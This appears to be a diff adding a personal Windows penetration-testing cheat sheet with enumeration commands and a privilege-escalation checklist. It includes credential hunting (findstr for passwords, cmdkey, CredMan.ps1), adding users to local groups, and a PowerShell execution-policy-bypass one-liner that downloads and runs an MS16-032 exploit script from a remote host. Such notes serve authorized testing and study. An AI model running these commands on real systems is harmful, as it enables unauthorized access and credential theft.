@@ -1,0 +1,58 @@
+dir \ /s/b file.txt
+  recursively search for file
+  
+set
+  print environment variables (normal users: \Document and Settings\user or \Users\user, system users C:\WINDOWS\system32\config\systemprofile)
+  Will need to deduct which user we are based off this if it's an early instance of Windows
+  
+net localgroup groupname username /add
+  add user to localgroup
+  
+net user user password
+  change user pass
+  
+netstat -ano 
+  running processes on machine
+  
+systeminfo
+  OS version | patches
+  
+findstr /spin "password" *.*
+  check all files for the string password
+  
+tasklist /v
+  Show currently running processes and user running it
+  
+cmdkey /list
+  Show stored credentials
+  
+https://www.abatchy.com/2017/03/powershell-download-file-one-liners
+  powershell download oneliners
+ 
+powershell.exe -ExecutionPolicy Bypass "IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<port>/ms16-032.ps1'); Invoke-ms16-032"
+  diskless powershell script upload & exec
+  
+--privesc--
+1. Who do we have access as?
+  set | whoami /all
+  
+2. Do we have the ability to access Administrator files?
+  dir \Users\Administrator
+  
+3. How can we transfer files?
+  https://www.abatchy.com/2017/03/powershell-download-file-one-liners | wget | certutil | curl | smb | ftp
+
+4. Check for weak config
+  https://pentest.tonyng.net/windows-privilege-escalation-a-cheatsheet/
+  whoami /all | net user username 
+    SeImpersonate | SeDebug | SeTakeOwnership | SeLoadDriver | SeCreateToken | SeRestore | SeAssignPrimary | SeTcb
+    https://book.hacktricks.xyz/windows/windows-local-privilege-escalation
+  cmdkey /list
+    if admin credentials stored, use CredMan.ps1 if possible
+    powershell -C ".\CredMan.ps1 -ShoCred"
+  schtasks
+    check scheduled tasks
+  use icacls on Windows, Program Files etc to see if we have write permission
+
+5. Check if the machine is vulnerable to any publicly known exploits via Watson (exe in this directory)
+
